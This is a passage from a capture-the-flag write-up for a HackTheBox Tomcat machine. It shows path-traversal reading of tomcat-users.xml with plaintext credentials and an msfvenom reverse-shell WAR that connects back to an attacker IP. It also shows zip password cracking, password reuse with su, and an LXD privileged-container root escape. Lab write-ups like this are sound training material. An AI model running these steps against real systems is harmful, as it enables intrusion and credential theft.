</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl>$ curl &#39;http://megahosting.htb/news.php?file=../../../../../../../usr/share/tomcat9/etc/tomcat-users.xml&#39;
</span></span><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span class=line><span class=cl><span class=c>&lt;!--
</span></span></span><span class=line><span class=cl><span class=c>  Licensed to the Apache Software Foundation (ASF) under one or more
</span></span></span><span class=line><span class=cl><span class=c>  contributor license agreements.  See the NOTICE file distributed with
</span></span></span><span class=line><span class=cl><span class=c>  this work for additional information regarding copyright ownership.
</span></span></span><span class=line><span class=cl><span class=c>  The ASF licenses this file to You under the Apache License, Version 2.0
</span></span></span><span class=line><span class=cl><span class=c>  (the &#34;License&#34;); you may not use this file except in compliance with
</span></span></span><span class=line><span class=cl><span class=c>  the License.  You may obtain a copy of the License at
</span></span></span><span class=line><span class=cl><span class=c>
</span></span></span><span class=line><span class=cl><span class=c>      http://www.apache.org/licenses/LICENSE-2.0
</span></span></span><span class=line><span class=cl><span class=c>
</span></span></span><span class=line><span class=cl><span class=c>  Unless required by applicable law or agreed to in writing, software
</span></span></span><span class=line><span class=cl><span class=c>  distributed under the License is distributed on an &#34;AS IS&#34; BASIS,
</span></span></span><span class=line><span class=cl><span class=c>  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
</span></span></span><span class=line><span class=cl><span class=c>  See the License for the specific language governing permissions and
</span></span></span><span class=line><span class=cl><span class=c>  limitations under the License.
</span></span></span><span class=line><span class=cl><span class=c>--&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;tomcat-users</span> <span class=na>xmlns=</span><span class=s>&#34;http://tomcat.apache.org/xml&#34;</span>
</span></span><span class=line><span class=cl>              <span class=na>xmlns:xsi=</span><span class=s>&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
</span></span><span class=line><span class=cl>              <span class=na>xsi:schemaLocation=</span><span class=s>&#34;http://tomcat.apache.org/xml tomcat-users.xsd&#34;</span>
</span></span><span class=line><span class=cl>              <span class=na>version=</span><span class=s>&#34;1.0&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl><span class=c>&lt;!--
</span></span></span><span class=line><span class=cl><span class=c>  NOTE:  By default, no user is included in the &#34;manager-gui&#34; role required
</span></span></span><span class=line><span class=cl><span class=c>  to operate the &#34;/manager/html&#34; web application.  If you wish to use this app,
</span></span></span><span class=line><span class=cl><span class=c>  you must define such a user - the username and password are arbitrary. It is
</span></span></span><span class=line><span class=cl><span class=c>  strongly recommended that you do NOT use one of the users in the commented out
</span></span></span><span class=line><span class=cl><span class=c>  section below since they are intended for use with the examples web
</span></span></span><span class=line><span class=cl><span class=c>  application.
</span></span></span><span class=line><span class=cl><span class=c>--&gt;</span>
</span></span><span class=line><span class=cl><span class=c>&lt;!--
</span></span></span><span class=line><span class=cl><span class=c>  NOTE:  The sample user and role entries below are intended for use with the
</span></span></span><span class=line><span class=cl><span class=c>  examples web application. They are wrapped in a comment and thus are ignored
</span></span></span><span class=line><span class=cl><span class=c>  when reading this file. If you wish to configure these users for use with the
</span></span></span><span class=line><span class=cl><span class=c>  examples web application, do not forget to remove the &lt;!.. ..&gt; that surrounds
</span></span></span><span class=line><span class=cl><span class=c>  them. You will also need to set the passwords to something appropriate.
</span></span></span><span class=line><span class=cl><span class=c>--&gt;</span>
</span></span><span class=line><span class=cl><span class=c>&lt;!--
</span></span></span><span class=line><span class=cl><span class=c>  &lt;role rolename=&#34;tomcat&#34;/&gt;
</span></span></span><span class=line><span class=cl><span class=c>  &lt;role rolename=&#34;role1&#34;/&gt;
</span></span></span><span class=line><span class=cl><span class=c>  &lt;user username=&#34;tomcat&#34; password=&#34;&lt;must-be-changed&gt;&#34; roles=&#34;tomcat&#34;/&gt;
</span></span></span><span class=line><span class=cl><span class=c>  &lt;user username=&#34;both&#34; password=&#34;&lt;must-be-changed&gt;&#34; roles=&#34;tomcat,role1&#34;/&gt;
</span></span></span><span class=line><span class=cl><span class=c>  &lt;user username=&#34;role1&#34; password=&#34;&lt;must-be-changed&gt;&#34; roles=&#34;role1&#34;/&gt;
</span></span></span><span class=line><span class=cl><span class=c>--&gt;</span>
</span></span><span class=line><span class=cl>   <span class=nt>&lt;role</span> <span class=na>rolename=</span><span class=s>&#34;admin-gui&#34;</span><span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>   <span class=nt>&lt;role</span> <span class=na>rolename=</span><span class=s>&#34;manager-script&#34;</span><span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>   <span class=nt>&lt;user</span> <span class=na>username=</span><span class=s>&#34;tomcat&#34;</span> <span class=na>password=</span><span class=s>&#34;$3cureP4s5w0rd123!&#34;</span> <span class=na>roles=</span><span class=s>&#34;admin-gui,manager-script&#34;</span><span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/tomcat-users&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>We can connect with <code>tomcat</code> / <code>$3cureP4s5w0rd123!</code> to <a href=http://megahosting.htb:8080/manager/html>http://megahosting.htb:8080/manager/html</a></p><p>The manager interface seems to be enabled only on localhost but we may
upload files without it.</p><p>We can download <code>server.xml</code>
<a href="http://megahosting.htb/news.php?file=../../../../../../../usr/share/tomcat9/etc/server.xml">http://megahosting.htb/news.php?file=../../../../../../../usr/share/tomcat9/etc/server.xml</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>      <span class=nt>&lt;Host</span> <span class=na>name=</span><span class=s>&#34;localhost&#34;</span>  <span class=na>appBase=</span><span class=s>&#34;webapps&#34;</span>
</span></span><span class=line><span class=cl>            <span class=na>unpackWARs=</span><span class=s>&#34;true&#34;</span> <span class=na>autoDeploy=</span><span class=s>&#34;true&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>...
</span></span></code></pre></td></tr></table></div></div><p>So it&rsquo;s accessible only from localhost but will unpack WARs and auto deploy
them.</p><p>By reading <code>web.xml</code> we can see that <code>.jsp</code> are allowed.</p><p>Now it&rsquo;s time to read documentation!</p><h2 id=http-exploitation-file-upload--rce>HTTP exploitation: File upload & RCE<a hidden class=anchor aria-hidden=true href=#http-exploitation-file-upload--rce>#</a></h2><p>Let&rsquo;s see the <a href=https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html#Supported_Manager_Commands>Supported Manager Commands</a>.</p><blockquote><p>All commands that the Manager application knows how to process are specified in a single request URI like this:</p><p><code>http://{host}:{port}/manager/text/{command}?{parameters}</code></p><p>where {host} and {port} represent the hostname and port number on which Tomcat is running, {command} represents the Manager command you wish to execute, and {parameters} represents the query parameters that are specific to that command. In the illustrations below, customize the host and port appropriately for your installation.</p><p>The commands are usually executed by HTTP GET requests. The /deploy command has a form that is executed by an HTTP PUT request.</p></blockquote><p>Then we can read <strong>Deploy A New Application Archive (WAR) Remotely</strong>.</p><blockquote><p><code>http://localhost:8080/manager/text/deploy?path=/foo</code></p><p>Upload the web application archive (WAR) file that is specified as the request data in this HTTP PUT request, install it into the appBase directory of our corresponding virtual host, and start, deriving the name for the WAR file added to the appBase from the specified path. The application can later be undeployed (and the corresponding WAR file removed) by use of the /undeploy command.</p><p>This command is executed by an HTTP PUT request.</p></blockquote><p>Let&rsquo;s craft a WAR reverse shell.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>msfvenom</span> <span class=o>--</span><span class=n>list</span> <span class=n>payloads</span> <span class=o>|</span> <span class=n>grep</span> <span class=o>-</span><span class=n>i</span> <span class=n>jsp</span>
</span></span><span class=line><span class=cl>    <span class=n>java</span><span class=o>/</span><span class=n>jsp_shell_bind_tcp</span>                             <span class=n>Listen</span> <span class=k>for</span> <span class=n>a</span> <span class=n>connection</span> <span class=ow>and</span> <span class=n>spawn</span> <span class=n>a</span> <span class=n>command</span> <span class=n>shell</span>
</span></span><span class=line><span class=cl>    <span class=n>java</span><span class=o>/</span><span class=n>jsp_shell_reverse_tcp</span>                          <span class=n>Connect</span> <span class=n>back</span> <span class=n>to</span> <span class=n>attacker</span> <span class=ow>and</span> <span class=n>spawn</span> <span class=n>a</span> <span class=n>command</span> <span class=n>shell</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>$</span> <span class=n>msfvenom</span> <span class=o>-</span><span class=n>p</span> <span class=n>java</span><span class=o>/</span><span class=n>jsp_shell_reverse_tcp</span> <span class=n>LHOST</span><span class=o>=</span><span class=mf>10.10</span><span class=o>.</span><span class=mf>14.49</span> <span class=n>LPORT</span><span class=o>=</span><span class=mi>9999</span> <span class=o>-</span><span class=n>f</span> <span class=n>war</span> <span class=o>&gt;</span> <span class=n>revshell</span><span class=o>.</span><span class=n>war</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ curl -X PUT -u &#39;tomcat&#39;:&#39;$3cureP4s5w0rd123!&#39; -T revshell.war &#39;http://tabby.htb:8080/manager/text/deploy?path=/cyfun&#39;
</span></span><span class=line><span class=cl>OK - Deployed application at context path [/cyfun]
</span></span></code></pre></td></tr></table></div></div><p>Now the <a href=http://megahosting.htb:8080/cyfun/>http://megahosting.htb:8080/cyfun/</a>.</p><p>Let&rsquo;s start a listener with <a href=https://pwncat.org/>pwncat</a>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>pwncat</span> <span class=o>-</span><span class=n>l</span> <span class=mi>9999</span> <span class=o>-</span><span class=n>vv</span>
</span></span><span class=line><span class=cl><span class=n>INFO</span><span class=p>:</span> <span class=n>Listening</span> <span class=n>on</span> <span class=p>:::</span><span class=mi>9999</span> <span class=p>(</span><span class=n>family</span> <span class=mi>10</span><span class=o>/</span><span class=n>IPv6</span><span class=p>,</span> <span class=n>TCP</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>INFO</span><span class=p>:</span> <span class=n>Listening</span> <span class=n>on</span> <span class=mf>0.0</span><span class=o>.</span><span class=mf>0.0</span><span class=p>:</span><span class=mi>9999</span> <span class=p>(</span><span class=n>family</span> <span class=mi>2</span><span class=o>/</span><span class=n>IPv4</span><span class=p>,</span> <span class=n>TCP</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>INFO</span><span class=p>:</span> <span class=n>Client</span> <span class=n>connected</span> <span class=n>from</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.194</span><span class=p>:</span><span class=mi>39776</span> <span class=p>(</span><span class=n>family</span> <span class=mi>2</span><span class=o>/</span><span class=n>IPv4</span><span class=p>,</span> <span class=n>TCP</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>id</span>
</span></span><span class=line><span class=cl><span class=n>uid</span><span class=o>=</span><span class=mi>997</span><span class=p>(</span><span class=n>tomcat</span><span class=p>)</span> <span class=n>gid</span><span class=o>=</span><span class=mi>997</span><span class=p>(</span><span class=n>tomcat</span><span class=p>)</span> <span class=n>groups</span><span class=o>=</span><span class=mi>997</span><span class=p>(</span><span class=n>tomcat</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>python3</span> <span class=o>-</span><span class=n>c</span> <span class=s1>&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class=line><span class=cl><span class=n>tomcat</span><span class=err>@</span><span class=n>tabby</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>tomcat9</span><span class=o>$</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=system-enumeration>System enumeration<a hidden class=anchor aria-hidden=true href=#system-enumeration>#</a></h2><p>With <a href=https://github.com/carlospolop/PEASS-ng>linpeas</a> we can find a backup file:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Backup</span> <span class=n>files</span><span class=err>?</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=n>rw</span><span class=o>-</span><span class=n>r</span><span class=o>--</span><span class=n>r</span><span class=o>--</span> <span class=mi>1</span> <span class=n>ash</span> <span class=n>ash</span> <span class=mi>8716</span> <span class=n>Jun</span> <span class=mi>16</span> <span class=mi>13</span><span class=p>:</span><span class=mi>42</span> <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>html</span><span class=o>/</span><span class=n>files</span><span class=o>/</span><span class=mi>16162020</span><span class=n>_backup</span><span class=o>.</span><span class=n>zip</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>tomcat</span><span class=err>@</span><span class=n>tabby</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>html</span><span class=o>$</span> <span class=n>ls</span>
</span></span><span class=line><span class=cl><span class=n>ls</span>
</span></span><span class=line><span class=cl><span class=n>assets</span>  <span class=n>favicon</span><span class=o>.</span><span class=n>ico</span>  <span class=n>files</span>  <span class=n>index</span><span class=o>.</span><span class=n>php</span>  <span class=n>logo</span><span class=o>.</span><span class=n>png</span>  <span class=n>news</span><span class=o>.</span><span class=n>php</span>  <span class=n>Readme</span><span class=o>.</span><span class=n>txt</span>
</span></span><span class=line><span class=cl><span class=n>tomcat</span><span class=err>@</span><span class=n>tabby</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>html</span><span class=o>$</span> <span class=n>ls</span> <span class=o>-</span><span class=n>lhA</span> <span class=n>files</span>
</span></span><span class=line><span class=cl><span class=n>ls</span> <span class=o>-</span><span class=n>lhA</span> <span class=n>files</span>
</span></span><span class=line><span class=cl><span class=n>total</span> <span class=mi>28</span><span class=n>K</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=n>rw</span><span class=o>-</span><span class=n>r</span><span class=o>--</span><span class=n>r</span><span class=o>--</span> <span class=mi>1</span> <span class=n>ash</span>  <span class=n>ash</span>  <span class=mf>8.6</span><span class=n>K</span> <span class=n>Jun</span> <span class=mi>16</span> <span class=mi>13</span><span class=p>:</span><span class=mi>42</span> <span class=mi>16162020</span><span class=n>_backup</span><span class=o>.</span><span class=n>zip</span>
</span></span><span class=line><span class=cl><span class=n>drwxr</span><span class=o>-</span><span class=n>xr</span><span class=o>-</span><span class=n>x</span> <span class=mi>2</span> <span class=n>root</span> <span class=n>root</span> <span class=mf>4.0</span><span class=n>K</span> <span class=n>Jun</span> <span class=mi>16</span> <span class=mi>20</span><span class=p>:</span><span class=mi>13</span> <span class=n>archive</span>
</span></span><span class=line><span class=cl><span class=n>drwxr</span><span class=o>-</span><span class=n>xr</span><span class=o>-</span><span class=n>x</span> <span class=mi>2</span> <span class=n>root</span> <span class=n>root</span> <span class=mf>4.0</span><span class=n>K</span> <span class=n>Jun</span> <span class=mi>16</span> <span class=mi>20</span><span class=p>:</span><span class=mi>13</span> <span class=n>revoked_certs</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=n>rw</span><span class=o>-</span><span class=n>r</span><span class=o>--</span><span class=n>r</span><span class=o>--</span> <span class=mi>1</span> <span class=n>root</span> <span class=n>root</span> <span class=mf>6.4</span><span class=n>K</span> <span class=n>Jun</span> <span class=mi>16</span> <span class=mi>11</span><span class=p>:</span><span class=mi>25</span> <span class=n>statement</span>
</span></span></code></pre></td></tr></table></div></div><p>It password protected, lets&rsquo; crack it with <code>fcrackzip</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>fcrackzip</span> <span class=o>-</span><span class=n>D</span> <span class=o>-</span><span class=n>p</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>share</span><span class=o>/</span><span class=n>wordlists</span><span class=o>/</span><span class=n>password</span><span class=o>/</span><span class=n>rockyou</span><span class=o>.</span><span class=n>txt</span> <span class=n>files</span><span class=o>/</span><span class=mi>16162020</span><span class=n>_backup</span><span class=o>.</span><span class=n>zip</span>
</span></span><span class=line><span class=cl><span class=n>possible</span> <span class=n>pw</span> <span class=n>found</span><span class=p>:</span> <span class=n>admin</span><span class=err>@</span><span class=n>it</span> <span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>$</span> <span class=n>unzip</span> <span class=mi>16162020</span><span class=n>_backup</span><span class=o>.</span><span class=n>zip</span>
</span></span><span class=line><span class=cl><span class=n>Archive</span><span class=p>:</span>  <span class=mi>16162020</span><span class=n>_backup</span><span class=o>.</span><span class=n>zip</span>
</span></span><span class=line><span class=cl>   <span class=n>creating</span><span class=p>:</span> <span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>html</span><span class=o>/</span><span class=n>assets</span><span class=o>/</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>16162020</span><span class=n>_backup</span><span class=o>.</span><span class=n>zip</span><span class=p>]</span> <span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>html</span><span class=o>/</span><span class=n>favicon</span><span class=o>.</span><span class=n>ico</span> <span class=n>password</span><span class=p>:</span>
</span></span><span class=line><span class=cl>  <span class=n>inflating</span><span class=p>:</span> <span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>html</span><span class=o>/</span><span class=n>favicon</span><span class=o>.</span><span class=n>ico</span>
</span></span><span class=line><span class=cl>   <span class=n>creating</span><span class=p>:</span> <span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>html</span><span class=o>/</span><span class=n>files</span><span class=o>/</span>
</span></span><span class=line><span class=cl>  <span class=n>inflating</span><span class=p>:</span> <span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>html</span><span class=o>/</span><span class=n>index</span><span class=o>.</span><span class=n>php</span>
</span></span><span class=line><span class=cl> <span class=n>extracting</span><span class=p>:</span> <span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>html</span><span class=o>/</span><span class=n>logo</span><span class=o>.</span><span class=n>png</span>
</span></span><span class=line><span class=cl>  <span class=n>inflating</span><span class=p>:</span> <span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>html</span><span class=o>/</span><span class=n>news</span><span class=o>.</span><span class=n>php</span>
</span></span><span class=line><span class=cl>  <span class=n>inflating</span><span class=p>:</span> <span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>html</span><span class=o>/</span><span class=n>Readme</span><span class=o>.</span><span class=n>txt</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=privilege-escalation-of-machine--tomcat-to-ash>Privilege Escalation of Machine : tomcat to ash<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--tomcat-to-ash>#</a></h2><p>Since the backup file was owned by ash we can try to re-use the archive password
for ash account:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>tomcat</span><span class=err>@</span><span class=n>tabby</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>tomcat9</span><span class=o>$</span> <span class=n>su</span> <span class=n>ash</span>
</span></span><span class=line><span class=cl><span class=n>Password</span><span class=p>:</span> <span class=n>admin</span><span class=err>@</span><span class=n>it</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ash</span><span class=err>@</span><span class=n>tabby</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>tomcat9</span><span class=o>$</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ash</span><span class=err>@</span><span class=n>tabby</span><span class=p>:</span><span class=o>~$</span> <span class=n>cat</span> <span class=n>user</span><span class=o>.</span><span class=n>txt</span>
</span></span><span class=line><span class=cl><span class=mi>13</span><span class=n>a5665425216a6a5a14fbd8aab23b93</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=privilege-escalation-of-machine--ash-to-root>Privilege Escalation of Machine : ash to root<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--ash-to-root>#</a></h2><p>ash is in adm and lxd groups:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>ash@tabby:~$ id
</span></span><span class=line><span class=cl>uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
</span></span></code></pre></td></tr></table></div></div><p><a href=https://book.hacktricks.xyz/linux-unix/privilege-escalation/lxd-privilege-escalation>lxc - Privilege escalation</a></p><p>Prepare distrobuilder:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>sudo</span> <span class=n>pacman</span> <span class=o>-</span><span class=n>S</span> <span class=n>go</span> <span class=n>debootstrap</span> <span class=n>rsync</span> <span class=n>gnupg</span> <span class=n>squashfs</span><span class=o>-</span><span class=n>tools</span> <span class=n>git</span> <span class=o>--</span><span class=n>needed</span>
</span></span><span class=line><span class=cl><span class=o>$</span> <span class=n>go</span> <span class=n>get</span> <span class=o>-</span><span class=n>d</span> <span class=o>-</span><span class=n>v</span> <span class=n>github</span><span class=o>.</span><span class=n>com</span><span class=o>/</span><span class=n>lxc</span><span class=o>/</span><span class=n>distrobuilder</span><span class=o>/</span><span class=n>distrobuilder</span>
</span></span><span class=line><span class=cl><span class=o>$</span> <span class=n>cd</span> <span class=o>$</span><span class=n>HOME</span><span class=o>/</span><span class=n>go</span><span class=o>/</span><span class=n>src</span><span class=o>/</span><span class=n>github</span><span class=o>.</span><span class=n>com</span><span class=o>/</span><span class=n>lxc</span><span class=o>/</span><span class=n>distrobuilder</span>
</span></span><span class=line><span class=cl><span class=o>$</span> <span class=n>make</span>
</span></span><span class=line><span class=cl><span class=o>$</span> <span class=n>cd</span>
</span></span></code></pre></td></tr></table></div></div><p>Prepare and build an image:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ mkdir -p $HOME/ContainerImages/alpine/
</span></span><span class=line><span class=cl>$ cd $HOME/ContainerImages/alpine/
</span></span><span class=line><span class=cl>$ wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
</span></span><span class=line><span class=cl>$ sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl># or
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ mkdir -p $HOME/ContainerImages/voidlinux/
</span></span><span class=line><span class=cl>$ cd $HOME/ContainerImages/voidlinux/
</span></span><span class=line><span class=cl>$ wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/voidlinux.yaml
</span></span><span class=line><span class=cl>$ sudo $HOME/go/bin/distrobuilder build-lxd voidlinux.yaml
</span></span></code></pre></td></tr></table></div></div><p>Then, upload to the server the files <code>lxd.tar.xz</code> and <code>rootfs.squashfs</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ ruby -run -e httpd . -p 8888
</span></span><span class=line><span class=cl>[2020-08-09 15:40:46] INFO  WEBrick 1.6.0
</span></span><span class=line><span class=cl>[2020-08-09 15:40:46] INFO  ruby 2.7.1 (2020-03-31) [x86_64-linux]
</span></span><span class=line><span class=cl>[2020-08-09 15:40:46] INFO  WEBrick::HTTPServer#start: pid=43919 port=8888
</span></span></code></pre></td></tr></table></div></div><p>Then on the target download & add the image:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ wget http://10.10.14.76:8888/lxd.tar.xz
</span></span><span class=line><span class=cl>$ wget http://10.10.14.76:8888/rootfs.squashfs
</span></span><span class=line><span class=cl>$ lxc image import lxd.tar.xz rootfs.squashfs --alias voidlinux
</span></span><span class=line><span class=cl>$ lxc image list
</span></span></code></pre></td></tr></table></div></div><p>Create a container and add root path:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ lxc init voidlinux cyfun -c security.privileged=true
</span></span><span class=line><span class=cl>$ lxc list
</span></span><span class=line><span class=cl>$ lxc config device add cyfun host-root disk source=/ path=/mnt/root recursive=true
</span></span></code></pre></td></tr></table></div></div><p>Execute the container:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ lxc start cyfun
</span></span><span class=line><span class=cl>$ lxc exec cyfun /bin/sh
</span></span><span class=line><span class=cl>$ cd /mnt/root
